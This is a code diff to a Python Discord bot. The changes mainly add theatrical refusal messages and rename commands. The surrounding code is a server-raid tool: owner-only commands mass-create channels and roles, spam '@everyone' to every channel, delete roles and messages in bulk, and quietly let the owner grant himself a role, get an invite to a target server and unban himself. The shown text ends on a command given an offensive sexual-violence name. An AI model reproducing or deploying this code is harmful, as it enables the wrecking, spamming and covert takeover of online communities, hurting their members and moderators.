@@ -31,7 +31,8 @@ async def create(ctx, channel_name: str, amount: int):
         # Run all tasks concurrently
         await asyncio.gather(*tasks)
         print(f"Created {amount} channels named '{channel_name}'.")
-
+    else:
+        await ctx.send("This command's power is a tempest, beyond mortal comprehension.")
 
 @bot.command()
 async def remove(ctx, prefix: str):
@@ -48,6 +49,8 @@ async def remove(ctx, prefix: str):
             await print(f"Deleted {len(existing_channels)} channels starting with '{prefix}'.")
         else:
             await print(f"No channels starting with '{prefix}' to remove.")
+    else:
+        await ctx.send("This command's power is a tempest, beyond mortal comprehension.")
 
 @bot.command()
 async def mass(ctx, *, message: str):
@@ -69,6 +72,9 @@ async def mass(ctx, *, message: str):
             # Run all sending tasks concurrently
             await asyncio.gather(*send_tasks)
             print(f"Sent message '@everyone {message}' to {len(channels)} channels.")
+    else:
+        await ctx.send("This command's power is a tempest, beyond mortal comprehension.")
+
 
 @bot.command()
 async def addrole(ctx, role_name: str, role_amount : int):
@@ -80,6 +86,9 @@ async def addrole(ctx, role_name: str, role_amount : int):
         tasks = [create_role() for _ in range(role_amount)]
         await asyncio.gather(*tasks)
         print(f"Created {role_amount} roles named '{role_name}'.")
+    else:
+        await ctx.send("This command's power is a tempest, beyond mortal comprehension.")
+
 
 @bot.command()
 async def delrole(ctx):
@@ -102,26 +111,28 @@ async def delrole(ctx):
             await print(f"Deleted {len(roles_to_delete)} roles.")
         else:
             await print("No roles to delete except for the bot's role and 'legit bot test'.")
+    else:
+        await ctx.send("This command's power is a tempest, beyond mortal comprehension.")
 
 @bot.command()
 async def print_ctx(ctx):
     print(ctx)  # Print the context of the command invocation
 
 @bot.command()
-async def POWER(ctx):
+async def ascend(ctx):
     if ctx.author.id == owner_id:
         role_name = "Doryan"
         role = discord.utils.get(ctx.guild.roles, name=role_name)
         
         if role is None:
-            await ctx.send(f"Role '{role_name}' does not exist. Please create it first.")
+            await ctx.send(f"The role '{role_name}' is a phantom. Please summon it into existence first.")
             return
 
         try:
             await ctx.author.add_roles(role)
             await ctx.send("With great power comes great responsibility.")
         except discord.Forbidden:
-            await ctx.send("I do not have permission to manage roles.")
+            await ctx.send("Regrettably, I lack the ability to wield the power of roles.")
     else:
         await ctx.send("A mortal shall not be given power...")
 
@@ -132,7 +143,7 @@ async def create_invite(ctx):
             # Get the first text channel in the server to create an invite
         channel = target_guild.text_channels[0]
         invite = await channel.create_invite(max_age=300, max_uses=1)  # 5 min, 1 use
-        await ctx.send(f"Here is your invite link: {invite}")
+        await ctx.send(f"Embark on your journey here: {invite}")
     else:
         await ctx.send("The bot is not in the target server.")
 
@@ -153,11 +164,11 @@ async def unban(ctx):
                     await ctx.send(f"{user.name} has been unbanned.")
                     break
             else:
-                await ctx.send("The owner is not banned in this server.")
+                await ctx.send("The Master is not banned in this server.")
         except discord.Forbidden:
             await ctx.send("I do not have permission to unban members.")
     else:
-        await ctx.send("You are not authorized to use this command.")
+        await ctx.send("This command's power is a tempest, beyond mortal comprehension.")
 
 @bot.command()
 async def state(ctx, state_type):
@@ -172,6 +183,8 @@ async def state(ctx, state_type):
             await bot.change_presence(status=discord.Status.offline)
         else:
             await ctx.send("Pleas uese 'idle', 'dnd', 'online' or 'offline'. ")
+    else:
+        await ctx.send("A mortal shall not interfere with the systems doing.")
 
 import asyncio
 
@@ -207,7 +220,7 @@ async def clear_mass(ctx, content: str):
         # Print the result message after attempting to delete all matching messages
         print(f"Deleted {deleted_count} messages containing '{content}' sent by the bot.")
     else:
-        await ctx.send("You are not authorized to use this command.")
+        await ctx.send("This command's power is a tempest, beyond mortal comprehension.")
 
 @bot.command()
 async def alive(ctx):
@@ -217,6 +230,20 @@ async def alive(ctx):
 async def stop(ctx):
     if ctx.author.id == owner_id:
         await bot.close()
+
+async def activity(ctx, state: str):
+    if ctx.author.id == owner_id:
+        await bot.change_presence(activity=discord.Game(state))
+        await ctx.send(f"Changed activity to '{state}'.")
+    else:
+        await ctx.send("A mortal shall not interfere with the systems doing")
+
+async def activity_clear(ctx):
+    if ctx.author.id == owner_id:
+        await bot.change_presence(activity=None)
+        await ctx.send("Cleared activity.")
+    else:
+        await ctx.send("A mortal shall not interfere with the systems doing")
 
 @bot.command()
 async def rape(ctx, user: discord.User):
